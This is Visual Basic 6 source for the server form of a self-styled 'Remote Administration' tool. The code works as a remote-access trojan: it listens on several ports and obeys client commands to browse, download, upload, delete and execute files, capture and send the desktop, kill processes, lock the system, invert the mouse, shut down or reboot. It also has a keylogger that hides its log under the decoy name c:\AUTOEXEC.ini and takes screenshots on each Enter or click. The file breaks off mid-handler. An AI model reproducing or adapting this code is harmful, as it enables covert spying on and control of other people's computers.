VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{6FBA474E-43AC-11CE-9A0E-00AA0062BB4C}#1.0#0"; "SYSINFO.OCX"
Begin VB.Form frmServer 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Remote Administration - Server"
   ClientHeight    =   6360
   ClientLeft      =   150
   ClientTop       =   720
   ClientWidth     =   3990
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6360
   ScaleWidth      =   3990
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrLock 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   720
      Top             =   5640
   End
   Begin VB.PictureBox Picture1 
      Height          =   615
      Left            =   0
      Picture         =   "frmServer.frx":0442
      ScaleHeight     =   555
      ScaleWidth      =   555
      TabIndex        =   9
      TabStop         =   0   'False
      Top             =   5640
      Width           =   615
   End
   Begin VB.TextBox Text2 
      Height          =   3615
      Left            =   2400
      TabIndex        =   8
      TabStop         =   0   'False
      Text            =   "Text2"
      Top             =   1680
      Width           =   1455
   End
   Begin VB.Timer MessageTimer 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   120
      Top             =   4080
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   120
      Top             =   3600
   End
   Begin VB.Timer KeyTimer 
      Enabled         =   0   'False
      Interval        =   5
      Left            =   120
      Top             =   3120
   End
   Begin MSWinsockLib.Winsock sckProcesses 
      Left            =   120
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6970
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   255
      Left            =   840
      TabIndex        =   6
      TabStop         =   0   'False
      Top             =   5280
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   720
      TabIndex        =   5
      TabStop         =   0   'False
      Text            =   "Text1"
      Top             =   4920
      Width           =   1575
   End
   Begin VB.ListBox List1 
      Height          =   3180
      Left            =   720
      TabIndex        =   4
      TabStop         =   0   'False
      Top             =   1680
      Width           =   1575
   End
   Begin SysInfoLib.SysInfo SysInfo 
      Left            =   0
      Top             =   5040
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock SockExplorer 
      Left            =   120
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6967
   End
   Begin MSWinsockLib.Winsock W1 
      Left            =   120
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6966
   End
   Begin VB.CommandButton cmdClose 
      Caption         =   "Close"
      Height          =   375
      Left            =   2640
      TabIndex        =   3
      Top             =   120
      Width           =   1095
   End
   Begin VB.CommandButton cmdStop 
      Caption         =   "Stop"
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   120
      Width           =   1095
   End
   Begin VB.CommandButton cmdStart 
      Caption         =   "Start"
      Height          =   375
      Left            =   240
      TabIndex        =   1
      Top             =   120
      Width           =   1095
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   4680
      Width           =   735
   End
   Begin VB.Label lblStatus 
      BackColor       =   &H00000000&
      Caption         =   " Status:  Idle"
      ForeColor       =   &H00FF8080&
      Height          =   735
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   3735
   End
   Begin VB.Menu mnuopt 
      Caption         =   "&Options"
      Begin VB.Menu mnuoptShow 
         Caption         =   "Show Sever Options"
      End
      Begin VB.Menu mnuoptSep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAbout 
         Caption         =   "About Remote Admin"
      End
      Begin VB.Menu mnuoptSep1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuoptstop 
         Caption         =   "Stop Server"
      End
      Begin VB.Menu mnuoptClose 
         Caption         =   "Close Server"
      End
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Allowed As Boolean
Dim FldrName As String
Dim bFileTransfer As Boolean
' added for HUGE folder inventory
Dim FS As Long                  'len(sData)
Dim Filez(0 To 50) As String    'sData after it's broken up
Dim Fcount As Integer           'How many times it must be broken up
' for emptying recycle bin
Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hwnd As Long, ByVal pszRootPath As String, ByVal dwFlags As Long) As Long
' for getting external IP of the server
Dim HTML As String
Dim Start As Integer
Dim Finish As Integer
Dim length As Integer
Dim ExIP As String
'for Key Logging
Dim boolVal As Boolean
Dim i, Key
Dim PrevX, PrevY
Dim KeyList, STRNG
Dim HitEnter As Boolean
Dim KeyChar, PriorValx
Dim pos As POINTAPI
Dim Prev As POINTAPI
Dim rpos As Long
'***************
Dim Hidden As Boolean
Dim Uzr As String
Dim MSG As String
Dim Data As String
Private Const MAX_PATH& = 260
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * MAX_PATH
End Type
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Dim X(100), y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
' **** for icon in sys tray ****
Private Type NOTIFYICONDATA
    cbSize As Long
    hwnd As Long
    uId As Long
    uFlags As Long
    ucallbackMessage As Long
    hIcon As Long
    szTip As String * 64
End Type
Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2
Private Const WM_MOUSEMOVE = &H200
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4
Private Const WM_LBUTTONDBLCLK = &H203
Private Const WM_LBUTTONDOWN = &H201
Private Const WM_LBUTTONUP = &H202
Private Const WM_RBUTTONDBLCLK = &H206
Private Const WM_RBUTTONDOWN = &H204
Private Const WM_RBUTTONUP = &H205
Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Dim t As NOTIFYICONDATA
Private Sub AddIcon2Tray()
' **** for icon in sys tray ****
t.cbSize = Len(t)
t.hwnd = Picture1.hwnd
t.uId = 1&
t.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
t.ucallbackMessage = WM_MOUSEMOVE
'this is where the Form's Icon gets called
t.hIcon = Me.Icon
'this is where the tool tip goes
t.szTip = "Remote Admin Server" & Chr$(0)
Shell_NotifyIcon NIM_ADD, t
End Sub
Private Sub RemoveIconFromTray()
On Error Resume Next
t.cbSize = Len(t)
t.hwnd = Picture1.hwnd
t.uId = 1&
Shell_NotifyIcon NIM_DELETE, t
End Sub
Public Sub MakeRecycleBinEmpty(Optional ByVal Drive As String, Optional NoConfirmation As Boolean, Optional NoProgress As Boolean, Optional NoSound As Boolean)
 Dim hwnd, flags As Long
 On Error Resume Next
 hwnd = Screen.ActiveForm.hwnd
 If Len(Drive) > 0 Then _
  Drive = Left$(Drive, 1) & ":\"
 flags = (NoConfirmation And &H1) Or (NoProgress And &H2) Or (NoSound And &H4)
 SHEmptyRecycleBin hwnd, Drive, flags
End Sub
Private Sub cmdClose_Click()
Unload frmOptions
If lblStatus.Caption <> " Status:  Idle" Then
    MsgBox "The Server Is Still Running.  You Must Stop The Server.", vbInformation, "SERVER INFORMATION"
    Exit Sub
End If
Unload frmChat
Unload Me
End
End Sub
Private Sub Command1_Click()
Dim TT As String
TT = Text1.Text
KillApp (TT)
End Sub
Public Function KillApp(myName As String) As Boolean
Const PROCESS_ALL_ACCESS = 0
Dim uProcess As PROCESSENTRY32
Dim rProcessFound As Long
Dim hSnapshot As Long
Dim szExename As String
Dim exitCode As Long
Dim myProcess As Long
Dim AppKill As Boolean
Dim appCount As Integer
Dim i As Integer
On Local Error GoTo Finish
appCount = 0
Const TH32CS_SNAPPROCESS As Long = 2&
uProcess.dwSize = Len(uProcess)
hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
rProcessFound = ProcessFirst(hSnapshot, uProcess)
List1.Clear
Do While rProcessFound
    i = InStr(1, uProcess.szexeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
    List1.AddItem (szExename)
    If Right$(szExename, Len(myName)) = LCase$(myName) Then
        KillApp = True
        appCount = appCount + 1
        myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
        AppKill = TerminateProcess(myProcess, exitCode)
        Call CloseHandle(myProcess)
    End If
    rProcessFound = ProcessNext(hSnapshot, uProcess)
Loop
Call CloseHandle(hSnapshot)
Finish:
End Function
Private Sub cmdStart_Click()
W1.Close
W1.Listen
lblStatus.Caption = " Status:  Listening"
SockExplorer.Close
SockExplorer.Listen
End Sub
Private Sub cmdStop_Click()
Unload frmChat
SockExplorer.Close
W1.Close
lblStatus.Caption = " Status:  Idle"
End Sub


Private Sub ExIpTimer_Timer()
Exit Sub
End Sub

Private Sub Form_Activate()
rpos = GetCursorPos(pos)
' FOR KEY LOGGING ''''
HitEnter = False
'ENTER key status is FALSE (NOT PRESSED)
End Sub
Private Sub Form_Load()
mnuopt.Visible = False
Load frmOptions
AddIcon2Tray
Dim X As Integer
For X = 0 To 50
    Filez(X) = ""
Next X
Uzr = (Environ("username"))
Me.Height = 1875
Me.Width = 4080
Me.Top = 0
Me.Left = 0
cmdStart = True
sckProcesses.Close
sckProcesses.Listen
KillApp ("none")
Command1.Caption = "Close Program"
Text1.Text = ""
End Sub
Private Sub StartLogging()
'Location of the file that holds each KEY STROKE
Open "c:\AUTOEXEC.ini" For Output As #1   'Open file in WRITING mode
    STRNG = Now
    Print #1, STRNG     'Time at which monitoring the KEY STROKES started.
    STRNG = ""
    Randomize
'Array holds the KeyConstants
KeyList = Array(vbKeyLButton, vbKeyRButton, vbKeyCancel, vbKeyMButton, vbKeyBack, _
                  vbKeyTab, vbKeyClear, vbKeyReturn, vbKeyShift, vbKeyControl, _
                  vbKeyMenu, vbKeyPause, vbKeyCapital, vbKeyEscape, _
                  vbKeyPageUp, vbKeyPageDown, vbKeyEnd, vbKeyHome, vbKeyLeft, _
                  vbKeyUp, vbKeyRight, vbKeyDown, vbKeySelect, vbKeyPrint, _
                  vbKeyExecute, vbKeySnapshot, vbKeyInsert, vbKeyDelete, _
                  vbKeyHelp, vbKeyNumlock, vbKeyF1, vbKeyF2, vbKeyF3, vbKeyF4, _
                  vbKeyF5, vbKeyF6, vbKeyF7, vbKeyF8, vbKeyF9, vbKeyF10, vbKeyF11, _
                  vbKeyF12, vbKeyF13, vbKeyF14, vbKeyF15, vbKeyF16, vbKeyNumpad0, _
                  vbKeyNumpad1, vbKeyNumpad2, vbKeyNumpad3, vbKeyNumpad4, vbKeyNumpad5, _
                  vbKeyNumpad6, vbKeyNumpad7, vbKeyNumpad8, vbKeyNumpad9, vbKeyMultiply, _
                  vbKeyAdd, vbKeySeparator, vbKeySubtract, vbKeyDecimal, vbKeyDivide)
'Array holds the KeyConstants' Name
KeyChar = Array("LButton", "RButton", "Cancel", "MButton", "Back", _
                    "Tab", "Clear", "Return", "Shift", "Control", _
                    "Alt", "Pause", "CapsLock", "Escape", _
                    "PageUp", "PageDown", "End", "Home", "Left", _
                    "Up", "Right", "Down", "Select", "Print", _
                    "Execute", "Snapshot", "Insert", "Delete", _
                    "Help", "Numlock", "F1", "F2", "F3", "F4", "F5", "F6", _
                    "F7", "F8", "F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", _
                    "Numpad0", "Numpad1", "Numpad2", "Numpad3", "Numpad4", "Numpad5", "Numpad6", _
                    "Numpad7", "Numpad8", "Numpad9", "Multiply", "Add", "Separator", "Subtract", _
                    "Decimal", "Divide")
KeyTimer.Enabled = True
End Sub
Private Sub StopLogging()
    STRNG = Now
    Print #1, STRNG 'Time at which monitoring the KEY STROKES are stopped.
    Close #1
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
RemoveIconFromTray
Unload frmOptions
Unload Me
End
End Sub

Private Sub Form_Terminate()
RemoveIconFromTray
Unload frmOptions
Unload Me
End Sub

Private Sub Form_Unload(Cancel As Integer)
RemoveIconFromTray
Unload frmOptions
Unload Me
End
End Sub

Private Sub KeyTimer_Timer()
On Error Resume Next
Dim tPA As POINTAPI
Dim fStr As String
' Get cursor cordinates or MOUSE Position i.e (x,y)
GetCursorPos tPA
'Scan the Array first : Special keys
For q = 0 To 61
    Key = GetAsyncKeyState(KeyList(q))  'Get the status of each KEY
    If Key = -32767 Then                'Key has been Pressed
    If KeyChar(q) = "Return" Or KeyChar(q) = "LButton" Then 'Key Pressed is ENTER/RETURN Key or Left Mouse Button
        KeyTimer.Enabled = False
        'Takes the snapshot of the screen currently viewing by the user of the system.
        fStr = App.Path & "\" & Time & ".bmp"
        boolVal = fSaveGuiToFile(fStr)
        KeyTimer.Enabled = True   'Resume monitoring
        HitEnter = True
    End If
    If KeyChar(q) = "F10" Then StopLogging    'Stop Monitoring KEY STROKES if F10 Key is pressed
        'Text1 = Text1 & "[" & KeyChar(q) & "]"
        STRNG = STRNG & "[" & KeyChar(q) & "]"  'Key Pressed value
        If tPA.X <> PrevX Or PrevY <> tPA.y Then
            STRNG = STRNG & "x:" & tPA.X & "y:" & tPA.y     'Click Position
        End If
        PrevX = tPA.X
        PrevY = tPA.y
    End If
Next q
'Scan the ASCII table
For q = 32 To 127
    Key = GetAsyncKeyState(q)   'Get the status of each KEY
    If Key = -32767 Then        'Key has been Pressed
        'Text1 = Text1 & Chr(q)
        STRNG = STRNG & Chr(q)  'Key Pressed value
        'If i = 90 Then Me.Show
    End If
Next q
'ENTER/Return Key is pressed - Clear the string and status of ENTER key
If HitEnter = True Then Print #1, STRNG: STRNG = "": HitEnter = False
End Sub

Private Sub MessageTimer_Timer()
lblStatus.ForeColor = &HFF8080
If W1.State = sckConnected Then
    lblStatus.Caption = " Status:  Connected"
    MessageTimer.Enabled = False
Else
    lblStatus.Caption = " Status:  Listening"
End If
End Sub

Private Sub mnuAbout_Click()
frmAbout.Show
End Sub

Private Sub mnuoptClose_Click()
cmdClose = True
End Sub

Private Sub mnuoptShow_Click()
frmOptions.Visible = True
frmOptions.cmdCancel.SetFocus
End Sub

Private Sub mnuoptstop_Click()
cmdStop = True
End Sub

Private Sub picture1_MouseMove(Button As Integer, Shift As Integer, X As Single, y As Single)
Static rec As Boolean, MSG As Long
Dim RetVal As String
Dim returnstring
Dim retvalue
MSG = X / Screen.TwipsPerPixelX
If rec = False Then
    rec = True
    Select Case MSG
    'this is where you would invoke a program
    'Use the Left Mouse Button to trigger a shell
    'to the desired program by clicking on
    'the TrayBar Icon shown (The Form's Icon)
    Case WM_LBUTTONDOWN:
    Case WM_LBUTTONDBLCLK
        Restore
        Me.Show
    Case WM_LBUTTONUP:
    Case WM_RBUTTONDBLCLK: 'not used in this program
    Case WM_RBUTTONDOWN:   'not used in this program
    Case WM_RBUTTONUP:
    'if Right Mouse Button is down then
    'Bring up the Popup Menu
        Me.PopupMenu mnuopt
    End Select
    rec = False
End If
End Sub
Private Sub Restore()
Me.WindowState = 0
End Sub
Private Sub sckProcesses_ConnectionRequest(ByVal requestID As Long)
If sckProcesses.State <> sckClosed Then
    sckProcesses.Close
    sckProcesses.Accept requestID
Else
    sckProcesses.Accept requestID
End If
Pause 10
Dim PROC As String
For q = 0 To List1.ListCount - 1
    PROC = List1.List(q)
    sckProcesses.SendData PROC
    Pause 50
Next q
PROC = "DONE"
sckProcesses.SendData PROC
Pause 10
sckProcesses.Close
End Sub
Private Sub SockExplorer_Close()
lblStatus.Caption = " Status:  Closing Remoter Explorer"
lblStatus.ForeColor = vbGreen
MessageTimer.Enabled = True
SockExplorer.Close
SockExplorer.Listen
End Sub
Private Sub sockExplorer_ConnectionRequest(ByVal requestID As Long)
lblStatus.Caption = " Status:  Opening Remote Explorer"
lblStatus.ForeColor = vbGreen
MessageTimer.Enabled = True
If SockExplorer.State <> sckClosed Then SockExplorer.Close
SockExplorer.Accept requestID
lblStatus.Caption = " Status:  Enumerating Drives"
lblStatus.ForeColor = vbGreen
MessageTimer.Enabled = True
SockExplorer.SendData Enum_Drives
End Sub
Private Sub NewFolder(NFDR As String)
    Debug.Print NFDR
    MkDir NFDR
    lblStatus.Caption = " Status:  Creating Folder - " & NFDR
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
End Sub
Private Sub sockExplorer_DataArrival(ByVal bytesTotal As Long)
Dim sIncoming As String
Dim iCommand As Integer
Dim sData As String
Dim lRet As Long
Dim Drive As String
Dim Command As String
SockExplorer.GetData sIncoming
If InStr(1, sIncoming, "|FN|") <> 0 Then
    FldrName = Mid(sIncoming, 5, Len(sIncoming))
    Dim RUAllowed As String
    RUAllowed = UCase(Environ("Systemroot"))
    If RUAllowed = "C:\" & UCase(FldrName) Then
        Allowed = False
    Else
        Allowed = True
    End If
    Exit Sub
End If
If InStr(1, sIncoming, "|NEWFOLDER|") <> 0 Then
    NewFolder Mid(sIncoming, 12, Len(sIncoming))
    Exit Sub
End If
If InStr(1, sIncoming, "|REMOVEFOLDER|") <> 0 Then
    RmDir Mid(sIncoming, 15, Len(sIncoming))
    Exit Sub
End If
Command = EvalData(sIncoming, 1)
Drive = EvalData(sIncoming, 2)
If InStr(1, sIncoming, "|FOLDERS|") <> 0 Then
    If Allowed = False Then
        SockExplorer.SendData "|NOT|"
        Exit Sub
    Else
        lblStatus.Caption = " Status:  Sending Folder (" & FldrName & ")"
        lblStatus.ForeColor = vbGreen
        MessageTimer.Enabled = True
        sData = Enum_Folders(Mid$(sIncoming, 10, Len(sIncoming)))
        SockExplorer.SendData sData
        DoEvents
        Sleep (500)
        sData = Enum_Files(Mid$(sIncoming, 10, Len(sIncoming)))
        EvalSize sData
        lblStatus.Caption = " Status:  Sending File Info For Folder: " & FldrName
        lblStatus.ForeColor = vbGreen
        MessageTimer.Enabled = True
        Exit Sub
    End If
End If
If InStr(1, sIncoming, "|GETFILE|") <> 0 Then
    If frmOptions.chkDownload.Value = 1 Then
        lblStatus.Caption = " Status:  Transfering - " & Mid(sIncoming, 10, Len(sIncoming))
        lblStatus.ForeColor = vbGreen
        MessageTimer.Enabled = True
        SendFile Mid$(sIncoming, 10, Len(sIncoming)), SockExplorer
        SockExplorer.SendData "|COMPLEET|"
        Exit Sub
    Else
        SockExplorer.SendData "|CANT|"
        Exit Sub
    End If
End If
If InStr(1, sIncoming, "|UPLOAD|") <> 0 Then
    Open Mid(sIncoming, 9, Len(sIncoming)) For Binary As #1
    bFileTransfer = True
    Exit Sub
End If
If InStr(1, sIncoming, "|DONEUPLOAD|") <> 0 Then
    Dim XYZ As Integer
    XYZ = Len(sIncoming)
    XYZ = XYZ - 12
    sIncoming = Mid(sIncoming, 1, XYZ)
    bFileTransfer = False
    Put #1, , sIncoming
    Close #1
    Exit Sub
End If
If bFileTransfer = True Then
    If InStr(1, sIncoming, "|FILESIZE|") <> 0 Then
        Exit Sub
    End If
    Put #1, , sIncoming
End If
End Sub
Function EvalSize(STRNG As String)
'I determined this size by seeing what the client
'actually was able to receive by using debug.print len(sIcoming)
'Anything over that size is "broken up."
FS = Len(STRNG)
If FS <= 4320 Then
    STRNG = "|SOME|" & Mid(STRNG, 8, Len(STRNG))
    SockExplorer.SendData STRNG
    Pause 10
    SockExplorer.SendData "|FILES|"
    Exit Function
End If
Dim FS2 As Integer
If FS > 4320 Then
    For i = 1 To 50
        If FS / i < 4320 Then
            FS2 = i
            'this is where I call the "BreakUp Thingy"
            BreakItUp STRNG, FS2
            Exit Function
        End If
    Next i
End If
End Function
Function BreakItUp(WhatToBreakUp As String, HowManyTimes As Integer)
WhatToBreakUp = Mid(WhatToBreakUp, 8, Len(WhatToBreakUp))
Dim SCount As Long
Dim StrB As Integer
Dim StrC As Integer
Dim strD As Long
StrC = 0
SCount = Len(WhatToBreakUp)
StrB = SCount / HowManyTimes
For i = 1 To HowManyTimes
    StrC = StrC + 1
    If StrC = 1 Then
        Filez(i) = "|SOME|" & Mid(WhatToBreakUp, 1, StrB)
        WhatToBreakUp = Mid(WhatToBreakUp, StrB + 1, Len(WhatToBreakUp))
    Else
        If Len(WhatToBreakUp) < StrB Then
            Filez(i) = "|SOME|" & WhatToBreakUp
            Exit For
        Else
            Filez(i) = "|SOME|" & Mid(WhatToBreakUp, 1, StrB)
            WhatToBreakUp = Mid(WhatToBreakUp, StrB + 1, Len(WhatToBreakUp))
        End If
    End If
Next i
For i = 0 To 50
    If Filez(i) <> "" Then
        SockExplorer.SendData Filez(i)
        Pause 10
    End If
Next i
SockExplorer.SendData "|FILES|"
For i = 0 To 50
    Filez(i) = ""
Next i
End Function
Function EvalData(Incoming As String, Side As Integer, Optional SubDiv As String) As String
Dim i As Integer
Dim TempStr As String
Dim Divider As String
If SubDiv = "" Then
    Divider = ","
Else
    Divider = SubDiv
End If
Select Case Side
    Case 1
        For i = 0 To Len(Incoming)
            TempStr = Left(Incoming, i)
            If Right(TempStr, 1) = Divider Then
                EvalData = Left(TempStr, Len(TempStr) - 1)
                Exit Function
            End If
        Next
    Case 2
        For i = 0 To Len(Incoming)
            TempStr = Right(Incoming, i)
            If Left(TempStr, 1) = Divider Then
                EvalData = Right(TempStr, Len(TempStr) - 1)
                Exit Function
            End If
        Next
End Select
End Function

Private Sub Timer1_Timer()
Prev = pos
r = GetCursorPos(pos)
Dim DiffY As Integer, DiffX As Integer
If Prev.y = 0 And pos.y = 0 Then
    DiffY = 1
ElseIf Prev.y = 599 And pos.y = 599 Then
    DiffY = -1
End If
If Prev.X = 0 And pos.X = 0 Then
    DiffX = 1
ElseIf Prev.X = 799 And pos.X = 799 Then
    DiffX = -1
End If
r = SetCursorPos(Prev.X - (pos.X - Prev.X) + DiffX, Prev.y - (pos.y - Prev.y) + DiffY)
r = GetCursorPos(pos)
End Sub

Private Sub tmrLock_Timer()
lblStatus.Caption = " Status:  System Locked"
End Sub

Private Sub W1_Close()
MessageTimer.Enabled = False
lblStatus.ForeColor = &HFF8080
lblStatus.Caption = " Status:  Listening"
W1.Close
W1.Listen
If Hidden = True Then Me.Show
End Sub
Private Sub W1_Connect()
lblStatus.Caption = " Status:  Connected"
End Sub
Private Sub W1_ConnectionRequest(ByVal requestID As Long)
If W1.State = sckConnected Then Exit Sub
If W1.State <> sckClosed Then
    W1.Close
    W1.Accept requestID
    lblStatus.Caption = " Status:  Connected"
Else
    W1.Accept requestID
    lblStatus.Caption = " Status:  Connected"
End If
Pause 10
sckProcesses.Close
sckProcesses.Listen
Login
End Sub
Private Sub Login()
If frmOptions.chkAutoLogin.Value = 1 Then
    If frmOptions.chkVerify.Value = 0 Then
        SendTheInformation
    Else
        MSG = "|LOGIN|"
        W1.SendData MSG
    End If
Else
    MSG = "|LOGIN|"
    W1.SendData MSG
End If
End Sub
Private Sub Execute(Filez As String)
    ShellExecute Me.hwnd, "Open", Filez, "", "", 1
End Sub
Private Sub OpenIE(Page As String)
If LCase(Mid(Page, 1, 4)) <> "http" Then
    ShellExecute Me.hwnd, vbNullString, "http://" & Page, vbNullString, Left$(CurDir$, 3), SW_SHOWNORMAL
Else
    ShellExecute Me.hwnd, vbNullString, Page, vbNullString, Left$(CurDir$, 3), SW_SHOWNORMAL
End If
End Sub
Private Sub NewMessage(Message As String)
Dim int1 As Integer
Dim int2 As Integer
Dim int3 As Integer
Dim MeSG As String
Dim tIpe As String
Dim title As String
int1 = InStr(1, Message, "1:")
int2 = InStr(1, Message, "2:")
int3 = InStr(1, Message, "3:")
int1 = int1 + 2
MeSG = Mid(Message, int1, int2 - int1)
int2 = int2 + 2
tIpe = Mid(Message, int2, int3 - int2)
int3 = int3 + 2
title = Mid(Message, int3, Len(Message))
MessageStyle MeSG, tIpe, title
End Sub
Private Sub MessageStyle(Body As String, Style As String, title As String)
If Hidden = True Then Me.Show
If LCase(Style) = "vbabortretryignore" Then MsgBox Body, vbAbortRetryIgnore, title
If LCase(Style) = "vbcritical" Then MsgBox Body, vbCritical, title
If LCase(Style) = "vbexclamation" Then MsgBox Body, vbExclamation, title
If LCase(Style) = "vbinformation" Then MsgBox Body, vbInformation, title
If LCase(Style) = "vbokcancel" Then MsgBox Body, vbOKCancel, title
If LCase(Style) = "vbokonly" Then MsgBox Body, vbOKOnly, title
If LCase(Style) = "vbretrycancel" Then MsgBox Body, vbRetryCancel, title
If LCase(Style) = "vbyesno" Then MsgBox Body, vbYesNo, title
If LCase(Style) = "vbyesnocancel" Then MsgBox Body, vbYesNoCancel, title
If Hidden = True Then Me.Hide
W1.SendData "|MSGOVER|"
End Sub
Private Sub W1_DataArrival(ByVal bytesTotal As Long)
Dim sFormated As String
Dim sIncoming As String
W1.GetData Data

If InStr(1, Data, "|UNLOCKSYSTEM|") <> 0 Then
    frmLock.lblUnlock.Caption = "TRUE"
    Unload frmLock
    tmrLock.Enabled = False
    lblStatus.Caption = " Status:  Connected"
    Exit Sub
End If
If InStr(1, Data, "|LOCKSYSTEM|") <> 0 Then
    tmrLock.Enabled = True
    frmLock.Show
    Exit Sub
End If
If InStr(1, Data, "|CLOSECHAT|") <> 0 Then
    lblStatus.ForeColor = vbGreen
    lblStatus.Caption = " Status:  Closing Chat"
    MessageTimer.Enabled = True
    Unload frmChat
    Pause 10
    Load frmChat
    Exit Sub
End If
If InStr(1, Data, "|CHAT|") <> 0 Then
    lblStatus.ForeColor = vbGreen
    lblStatus.Caption = " Status:  Starting Chat"
    MessageTimer.Enabled = True
    Load frmChat
    frmChat.Show
    Exit Sub
End If
If InStr(1, Data, "|EMPTYRECYCLEBIN|") <> 0 Then
    MakeRecycleBinEmpty c, True, True, False
    Exit Sub
End If
If InStr(1, Data, "|MSGBOX|") <> 0 Then
    lblStatus.ForeColor = vbGreen
    lblStatus.Caption = " Status:  Executing Message Box"
    MessageTimer.Enabled = True
    NewMessage Mid(Data, 9, Len(Data))
    Exit Sub
End If
If InStr(1, Data, "|INVERSEMOUSE|") <> 0 Then
    Timer1.Enabled = True
    lblStatus.ForeColor = vbGreen
    lblStatus.Caption = " Status:  Executing Inverse Mouse"
    MessageTimer.Enabled = True
    Exit Sub
End If
If InStr(1, Data, "|NORMALMOUSE|") <> 0 Then
    Timer1.Enabled = False
    lblStatus.Caption = " Status:  Executing Normal Mouse"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    Exit Sub
End If
If InStr(1, Data, "|STARTLOGGING|") <> 0 Then
    StartLogging
    lblStatus.Caption = " Status:  Executing Key-Logging"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    Exit Sub
End If
If InStr(1, Data, "|STOPLOGGING|") <> 0 Then
    StopLogging
    lblStatus.Caption = " Status:  Stopping Key-Logging"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    Exit Sub
End If
If InStr(1, Data, "|IE|") <> 0 Then
    OpenIE Mid(Data, 5, Len(Data))
    Exit Sub
End If
If InStr(1, Data, "|EXECUTE|") <> 0 Then
    Execute Mid(Data, 10, Len(Data))
    Exit Sub
End If
If InStr(1, Data, "|KILLFILE|") <> 0 Then
    Kill Mid$(Data, 11, Len(Data))
    lblStatus.Caption = "Status:  Deleting - " & Mid(Data, 11, Len(Data))
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    Exit Sub
End If
If InStr(1, Data, "|GETDESKTOP|") <> 0 Then
    Clipboard.Clear
    lblStatus.Caption = " Status:  Capturing Desktop"
    lblStatus.ForeColor = vbGreen
    GetDesktopPrint (App.Path & "\DESKTOP.BMP")
    sIncoming = App.Path & "\DESKTOP.BMP"
    lblStatus.Caption = " Status:  Sending Desktop"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    SendFile sIncoming, W1
    W1.SendData "|COMPLETE|"
    Exit Sub
End If
If InStr(1, Data, "|LOGOFF|") <> 0 Then
    LogOff
    Exit Sub
End If
If InStr(1, Data, "|SHUTDOWN|") <> 0 Then
    lblStatus.Caption = " Status:  Shutting Down PC"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    ShutDown
    Exit Sub
End If
If InStr(1, Data, "|REBOOT|") <> 0 Then
    lblStatus.Caption = " Status:  Rebooting PC"
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    ReBooT
    Exit Sub
End If
If InStr(1, Data, "|CLOSE|") <> 0 Then
    Unload Me
    End
End If
If InStr(1, Data, "|STOPPROCESS|") <> 0 Then
    Dim PR As String
    PR = Mid(Data, 14, Len(Data))
